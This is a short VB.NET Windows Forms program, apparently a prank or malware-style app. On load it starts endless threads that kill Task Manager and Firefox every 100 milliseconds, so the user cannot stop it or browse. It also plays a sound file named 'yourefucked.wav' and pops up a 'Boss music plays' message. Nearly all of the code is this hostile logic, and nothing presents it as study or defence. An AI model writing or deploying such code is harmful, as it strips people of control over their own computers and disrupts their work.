Imports System
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim T As New Threading.Thread(AddressOf Block)
        T.Start()
        Dim J As New Threading.Thread(AddressOf FuckingAnotherBrowser)
        J.Start()
        BackgroundWorker1.RunWorkerAsync()
    End Sub
    Sub Block()
        While True
            For Each P As Process In Process.GetProcessesByName("taskmgr")
                P.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Sub FuckingAnotherBrowser()
        While True
            For Each K As Process In Process.GetProcessesByName("firefox")
                K.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Form2.Show()
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        My.Computer.Audio.Play("yourefucked.wav")
        MessageBox.Show("*Boss music plays*")
    End Sub
End Class
